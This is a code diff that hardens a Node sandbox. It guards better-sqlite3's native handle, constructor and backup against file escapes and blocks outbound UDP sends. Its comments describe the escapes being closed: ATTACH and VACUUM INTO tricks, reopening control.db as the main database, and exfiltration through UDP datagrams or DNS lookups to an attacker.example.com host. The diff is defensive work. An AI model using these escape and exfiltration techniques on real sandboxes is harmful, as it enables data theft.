@@ -79,10 +79,13 @@ export function installSandboxHardening() {
     //      a sibling deploy's db and read it. Verified empirically.
     //   3. `VACUUM INTO '<path>'` / `db.backup('<path>')` — write the db to an
     //      arbitrary path (a clobber primitive).
-    // ATTACH/VACUUM can only reach SQLite through the exec/prepare entry points,
-    // and the tokenizer needs the literal keyword — so guarding the SQL text at
-    // that boundary cannot be bypassed. We block ATTACH outright (capsules don't
-    // need cross-db access) rather than parsing its path expression.
+    // We block ATTACH outright (capsules don't need cross-db access) rather than
+    // parsing its path expression. NOTE: guarding the JS-wrapper SQL text is NOT
+    // a complete boundary — the wrappers sit over a native handle whose own
+    // exec/prepare and constructor are directly reachable from capsule code. The
+    // native-layer block further below re-applies these guards on the native
+    // prototype + constructor; both layers are still a JS speed bump, not a
+    // kernel boundary (deploy/HARDENING.md §6/§7).
     const allowedRoot = path.resolve(process.cwd())
     const isInsideRoot = (target: string): boolean => {
       let resolved: string
@@ -169,6 +172,108 @@ export function installSandboxHardening() {
         throw new Error("SQLite extension loading is disabled in the capsule sandbox")
       })
     }
+
+    // The JS-wrapper seals above are NOT sufficient on their own: proto.exec /
+    // prepare / backup are thin wrappers over a NATIVE handle (`this[cppdb]`),
+    // and that handle — plus the native Database constructor reachable from it
+    // (`handle.constructor`) and from the cached addon — is directly callable by
+    // capsule code, skipping the wrappers entirely. Two proven escapes:
+    //   a) the handle's own native SQL methods run "ATTACH …" / "VACUUM INTO '…'"
+    //      with no wrapper guard at all.
+    //   b) `new handle.constructor('/abs/control.db', …)` opens ANY file as the
+    //      main db, then a plain SELECT reads it (no ATTACH keyword, so a
+    //      SQL-text guard never fires). This bypasses --permission, which does
+    //      not mediate sqlite's native open().
+    // So we must guard at the native layer too: the native prototype's SQL/file
+    // methods and the native constructor's path argument. This is still a JS
+    // speed bump, not a kernel boundary (see deploy/HARDENING.md §6/§7) — the
+    // real fix is bwrap / an in-process isolate — but it closes the directly
+    // reachable native file primitives.
+    try {
+      const warm = new bs(":memory:") as Record<symbol, unknown> & { close(): void }
+      let nativeHandle: Record<string, unknown> | null = null
+      for (const sym of Object.getOwnPropertySymbols(warm)) {
+        const v = warm[sym]
+        if (v && typeof v === "object") {
+          const p = Object.getPrototypeOf(v) as Record<string, unknown> | null
+          if (p && typeof p.exec === "function" && typeof p.prepare === "function") {
+            nativeHandle = v as Record<string, unknown>
+            break
+          }
+        }
+      }
+      const nativeProto = nativeHandle ? (Object.getPrototypeOf(nativeHandle) as Record<string, unknown>) : null
+      try {
+        warm.close()
+      } catch {
+        // best-effort
+      }
+      if (nativeProto) {
+        const sealNative = (name: string, value: (...a: any[]) => unknown): void => {
+          if (typeof nativeProto[name] === "function") {
+            Object.defineProperty(nativeProto, name, { value, writable: false, configurable: false })
+          }
+        }
+        const RealNative = nativeProto.constructor as (new (...a: any[]) => unknown) | undefined
+        if (typeof RealNative === "function") {
+          // Validate the file path on EVERY native construction. Legit use opens
+          // only `:memory:` or in-root paths; opening control.db / a sibling
+          // deploy as the main db is rejected here.
+          const GuardedNative = function (this: unknown, filename: unknown, ...rest: any[]) {
+            validateSqlitePath(filename)
+            return new (RealNative as new (...a: any[]) => unknown)(filename, ...rest)
+          } as unknown as new (...a: any[]) => unknown
+          ;(GuardedNative as { prototype: unknown }).prototype = nativeProto
+          // Both references a capsule can reach to the native ctor: the cached
+          // addon object (require('…better_sqlite3.node').Database) and the
+          // handle's own `.constructor`. Point both at the guarded ctor.
+          const nodeKey = Object.keys(require.cache).find((k) => k.endsWith(".node") && k.includes("better_sqlite3"))
+          const addon = nodeKey ? (require.cache[nodeKey]?.exports as Record<string, unknown> | undefined) : undefined
+          if (addon && addon.Database === RealNative) {
+            try {
+              Object.defineProperty(addon, "Database", { value: GuardedNative, writable: false, configurable: false })
+            } catch {
+              // best-effort
+            }
+          }
+          try {
+            Object.defineProperty(nativeProto, "constructor", {
+              value: GuardedNative,
+              writable: false,
+              configurable: false,
+            })
+          } catch {
+            // best-effort
+          }
+        }
+        const nativeExec = nativeProto.exec as ((this: unknown, sql: string) => unknown) | undefined
+        const nativePrepare = nativeProto.prepare as ((this: unknown, sql: string, ...r: any[]) => unknown) | undefined
+        if (typeof nativeExec === "function") {
+          sealNative("exec", function (this: unknown, sql: string) {
+            assertNoSqliteFileEscape(sql)
+            return nativeExec.call(this, sql)
+          })
+        }
+        if (typeof nativePrepare === "function") {
+          sealNative("prepare", function (this: unknown, sql: string, ...rest: any[]) {
+            assertNoSqliteFileEscape(sql)
+            return nativePrepare.call(this, sql, ...rest)
+          })
+        }
+        const nativeBackup = nativeProto.backup as ((this: unknown, dest: unknown, ...r: any[]) => unknown) | undefined
+        if (typeof nativeBackup === "function") {
+          sealNative("backup", function (this: unknown, dest: unknown, ...rest: any[]) {
+            validateSqlitePath(dest)
+            return nativeBackup.call(this, dest, ...rest)
+          })
+        }
+        sealNative("loadExtension", () => {
+          throw new Error("SQLite extension loading is disabled in the capsule sandbox")
+        })
+      }
+    } catch {
+      // native-handle shape changed or unavailable — best-effort
+    }
   } catch {
     // better-sqlite3 not resolvable here — nothing to seal, best-effort
   }
@@ -229,6 +334,31 @@ export async function installNetworkRestriction() {
     }
   } catch {
     // node:net should always be available; best-effort
+  }
+  // UDP: node:dgram does NOT go through net.Socket, and Node's --permission model
+  // does not gate the network at all, so without this a capsule can exfiltrate to
+  // any host:port with `dgram.createSocket('udp4').send(secret, port, ip)` — no
+  // DNS and no native code required. Seal the outbound entry points on the
+  // Socket prototype (send + connected-mode connect); bind/receive is harmless.
+  try {
+    const dgram = await import("node:dgram")
+    const proto = (dgram as unknown as { Socket?: { prototype?: Record<string, unknown> } }).Socket?.prototype
+    if (proto) {
+      const denyDgram = () => {
+        throw new Error(`${denyMsg} (udp datagram)`)
+      }
+      for (const name of ["send", "connect"]) {
+        if (typeof proto[name] === "function") {
+          try {
+            Object.defineProperty(proto, name, { value: denyDgram, writable: false, configurable: false })
+          } catch {
+            proto[name] = denyDgram
+          }
+        }
+      }
+    }
+  } catch {
+    // node:dgram should always be available; best-effort
   }
   // DNS: a capsule can leak data via dns.lookup("<secret>.attacker.example.com")
   // even with net.Socket.connect blocked, because the resolver query leaves the
